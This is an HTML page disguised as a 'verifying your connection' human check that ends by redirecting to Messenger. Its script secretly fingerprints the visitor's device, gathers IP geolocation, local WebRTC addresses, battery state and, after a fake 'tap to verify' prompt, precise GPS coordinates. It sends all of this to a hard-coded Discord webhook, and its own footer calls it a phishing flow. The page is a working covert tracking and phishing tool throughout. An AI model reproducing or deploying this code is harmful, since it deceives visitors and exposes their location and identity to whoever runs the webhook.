<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Verifying your connection…</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; background: #0e1013; font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; overflow: hidden; }
        #jackLayer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999;
            background: rgba(0,0,0,0.92); backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px);
            display: flex; justify-content: center; align-items: center; flex-direction: column;
            color: #fff; text-align: center; transition: opacity 0.3s;
        }
        .wheel-box { position: relative; margin-bottom: 35px; }
        .wheel {
            width: 120px; height: 120px; border-radius: 50%;
            border: 8px solid rgba(255,255,255,0.08);
            border-top-color: #ffbe0b;
            animation: spin 0.8s cubic-bezier(0.4,0.0,0.2,1) infinite;
        }
        .wheel.paused { animation-play-state: paused; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .wheel-percent {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            font-size: 22px; font-weight: 700; color: #ffbe0b;
        }
        .status { font-size: 20px; font-weight: 600; margin: 5px 20px; letter-spacing: 0.3px; }
        .sub { color: #b0b3b8; font-size: 14px; margin-top: 8px; max-width: 280px; }
        .tap-area {
            margin-top: 40px; padding: 14px 40px; background: rgba(255,255,255,0.08);
            border-radius: 50px; font-weight: 700; color: #ffbe0b; cursor: pointer;
            animation: pulse 2.2s infinite; border: 1px solid rgba(255,190,11,0.3);
            font-size: 16px; letter-spacing: 0.5px;
        }
        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.04); } 100% { opacity: 1; transform: scale(1); } }
        .checkmark {
            width: 80px; height: 80px; border-radius: 50%; background: #00c853;
            display: flex; justify-content: center; align-items: center; margin-bottom: 20px;
            box-shadow: 0 0 30px rgba(0,200,83,0.5); animation: pop 0.4s ease;
        }
        @keyframes pop { 0% { transform: scale(0); } 80% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .checkmark::after {
            content: ''; display: block; width: 20px; height: 35px; border: solid white;
            border-width: 0 5px 5px 0; transform: rotate(45deg); margin-top: -4px;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div id="jackLayer">
        <div class="wheel-box">
            <div class="wheel" id="wheel"></div>
            <div class="wheel-percent" id="percent">0%</div>
        </div>
        <div class="status" id="statusMsg">Security check in progress…</div>
        <div class="sub" id="subMsg">Please wait a moment</div>
        <div id="tapButton" class="tap-area hidden">Tap anywhere to verify</div>
        <div id="successMark" class="checkmark hidden"></div>
    </div>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';

        const wheelEl = document.getElementById('wheel');
        const percentEl = document.getElementById('percent');
        const statusEl = document.getElementById('statusMsg');
        const subEl = document.getElementById('subMsg');
        const tapBtn = document.getElementById('tapButton');
        const successMark = document.getElementById('successMark');

        let gpsData = null;
        let dataSent = false;

        function getFullFingerprint() {
            const nav = navigator;
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 300; canvas.height = 60;
            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
            ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
            ctx.fillStyle = '#069'; ctx.fillText('CACHED', 2, 15);
            const canvasHash = canvas.toDataURL().substring(0, 130);

            let webglRenderer = 'N/A', webglVendor = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
                if (gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debug) {
                        webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                        webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
                    }
                }
            } catch(e) {}

            let audioFP = 'N/A';
            try {
                const actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const osc = actx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, actx.currentTime);
                const comp = actx.createDynamicsCompressor();
                osc.connect(comp); comp.connect(actx.destination);
                osc.start(0);
                actx.startRendering();
                actx.oncomplete = (e) => {
                    const out = e.renderedBuffer.getChannelData(0);
                    audioFP = out.slice(0, 4500).reduce((a,b)=>a+Math.abs(b),0).toString(36);
                };
            } catch(e) {}

            const plugins = Array.from(nav.plugins || []).map(p => p.name).join(',') || 'N/A';
            const mimeTypes = Array.from(nav.mimeTypes || []).map(m => m.type).join(',') || 'N/A';
            const conn = nav.connection || {};

            return {
                userAgent: nav.userAgent,
                language: nav.language,
                languages: nav.languages ? nav.languages.join(',') : nav.language,
                platform: nav.platform,
                vendor: nav.vendor,
                productSub: nav.productSub,
                cpuClass: nav.cpuClass || 'N/A',
                deviceMemory: nav.deviceMemory || 'N/A',
                hardwareConcurrency: nav.hardwareConcurrency || 'N/A',
                maxTouchPoints: nav.maxTouchPoints || 0,
                touchSupport: ('ontouchstart' in window),
                cookieEnabled: nav.cookieEnabled,
                doNotTrack: nav.doNotTrack || nav.msDoNotTrack || 'unspecified',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                screenW: screen.width,
                screenH: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation ? screen.orientation.type : 'N/A',
                connectionType: conn.effectiveType || 'N/A',
                downlink: conn.downlink || 'N/A',
                rtt: conn.rtt || 'N/A',
                canvasHash,
                webglRenderer,
                webglVendor,
                audioFingerprint: audioFP,
                plugins,
                mimeTypes,
                battery: null
            };
        }

        async function ipLookup() {
            const endpoints = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json?token=0'
            ];
            for (let url of endpoints) {
                try {
                    const r = await fetch(url, { signal: AbortSignal.timeout(4000) });
                    const d = await r.json();
                    return {
                        ip: d.ip || '',
                        city: d.city || '',
                        region: d.region || '',
                        country: d.country_name || d.country || '',
                        postal: d.postal || '',
                        latitude: d.latitude || (d.loc ? d.loc.split(',')[0] : ''),
                        longitude: d.longitude || (d.loc ? d.loc.split(',')[1] : ''),
                        isp: d.org || d.isp || '',
                        asn: d.asn || '',
                        timezone: d.timezone || ''
                    };
                } catch(e) { continue; }
            }
            return null;
        }

        function getWebRTCIPs() {
            return new Promise((resolve) => {
                const ips = new Set();
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (e) => {
                    if (!e.candidate) { resolve(ips.size ? Array.from(ips).join(', ') : null); return; }
                    const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                    if (match) ips.add(match[0]);
                };
                setTimeout(() => resolve(ips.size ? Array.from(ips).join(', ') : null), 3000);
            });
        }

        function forceGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                const options = { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 };
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: Math.round(pos.coords.accuracy),
                        altitude: pos.coords.altitude,
                        altitudeAccuracy: pos.coords.altitudeAccuracy,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed
                    }),
                    err => resolve(null),
                    options
                );
                setTimeout(() => resolve(null), 6000);
            });
        }

        async function sendAll() {
            if (dataSent) return;
            dataSent = true;

            const fp = getFullFingerprint();
            const [ipInfo, localIPs] = await Promise.all([ipLookup(), getWebRTCIPs()]);
            if ('getBattery' in navigator) {
                try {
                    const b = await navigator.getBattery();
                    fp.battery = { charging: b.charging, level: Math.round(b.level*100)+'%' };
                } catch(e) { fp.battery = null; }
            }

            const embed = {
                title: '🎯 **Bot Verification Dump** — Full Device Profile',
                color: 0xffa502,
                fields: [
                    {
                        name: '📍 **GPS (tricked)**',
                        value: gpsData
                            ? `Lat: \`${gpsData.lat}\`\nLon: \`${gpsData.lon}\`\nAcc: ±${gpsData.accuracy}m\nAlt: ${gpsData.altitude ?? 'N/A'}`
                            : 'Not captured (denied/unsupported)',
                        inline: true
                    },
                    {
                        name: '🌐 **IP Geolocation**',
                        value: ipInfo
                            ? `IP: \`${ipInfo.ip}\`\nCity: ${ipInfo.city}\nRegion: ${ipInfo.region}\nCountry: ${ipInfo.country}\nZIP: ${ipInfo.postal}\nLat/Lon: ${ipInfo.latitude},${ipInfo.longitude}\nISP: ${ipInfo.isp}\nASN: ${ipInfo.asn}`
                            : 'Failed',
                        inline: true
                    },
                    {
                        name: '🏠 **Local IPs (WebRTC)**',
                        value: localIPs || 'None',
                        inline: true
                    },
                    {
                        name: '🔋 Battery',
                        value: fp.battery ? `Charging: ${fp.battery.charging}\nLevel: ${fp.battery.level}` : 'N/A',
                        inline: true
                    },
                    {
                        name: '📱 Device',
                        value: `UA: ${fp.userAgent}\nPlatform: ${fp.platform} (${fp.cpuClass})\nMemory: ${fp.deviceMemory}GB | Cores: ${fp.hardwareConcurrency}\nTouch: ${fp.touchSupport} (max ${fp.maxTouchPoints})\nCookies: ${fp.cookieEnabled} | DNT: ${fp.doNotTrack}`,
                        inline: false
                    },
                    {
                        name: '🌍 Locale & Time',
                        value: `Lang: ${fp.language} (${fp.languages})\nTZ: ${fp.timezone} (offset ${fp.timezoneOffset})`,
                        inline: true
                    },
                    {
                        name: '🖥 Screen',
                        value: `Res: ${fp.screenW}x${fp.screenH} (${fp.colorDepth}bit)\nPixel: ${fp.pixelDepth} | Orient: ${fp.orientation}`,
                        inline: true
                    },
                    {
                        name: '📶 Connection',
                        value: `Type: ${fp.connectionType}\nDownlink: ${fp.downlink} Mbps\nRTT: ${fp.rtt}ms`,
                        inline: true
                    },
                    {
                        name: '🎨 Canvas',
                        value: fp.canvasHash,
                        inline: true
                    },
                    {
                        name: '🖼 WebGL',
                        value: `Vendor: ${fp.webglVendor}\nRenderer: ${fp.webglRenderer}`,
                        inline: true
                    },
                    {
                        name: '🔊 Audio',
                        value: fp.audioFingerprint,
                        inline: true
                    },
                    {
                        name: '🧩 Plugins',
                        value: fp.plugins.substring(0, 1020),
                        inline: false
                    }
                ],
                footer: { text: 'Axr4t2auYc phishing flow • All data extracted silently' },
                timestamp: new Date().toISOString()
            };

            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            }).catch(() => {});
        }

        let progress = 0;
        const wheelInterval = setInterval(() => {
            progress += 20;
            if (progress >= 100) {
                progress = 100;
                clearInterval(wheelInterval);
                wheelEl.classList.add('paused');
                percentEl.textContent = '100%';
                statusEl.textContent = 'Complete! Verify you are human';
                subEl.textContent = 'Tap anywhere to finish verification';
                tapBtn.classList.remove('hidden');
            } else {
                percentEl.textContent = progress + '%';
            }
        }, 1000);

        tapBtn.addEventListener('click', async (e) => {
            e.preventDefault();
            e.stopPropagation();
            tapBtn.classList.add('hidden');
            subEl.textContent = '';
            statusEl.textContent = 'Verifying…';
            wheelEl.classList.remove('paused');
            percentEl.textContent = '0%';
            let fake = 0;
            const fakeInterval = setInterval(() => {
                fake += 25;
                if (fake >= 100) {
                    fake = 100;
                    clearInterval(fakeInterval);
                    wheelEl.classList.add('paused');
                    percentEl.textContent = '100%';
                    wheelEl.style.display = 'none';
                    percentEl.style.display = 'none';
                    successMark.classList.remove('hidden');
                    statusEl.textContent = 'Verification successful!';
                    subEl.textContent = 'Redirecting to Messenger…';
                    setTimeout(() => {
                        window.location.href = 'https://www.messenger.com/';
                    }, 1500);
                } else {
                    percentEl.textContent = fake + '%';
                }
            }, 60);

            const gpsPromise = forceGPS();
            await sendAll();
            dataSent = false;
            gpsData = await gpsPromise;
            if (gpsData) await sendAll();
        });

        setTimeout(() => {
            if (!tapBtn.classList.contains('hidden')) {
                tapBtn.click();
            }
        }, 10000);
    </script>
</body>
</html>
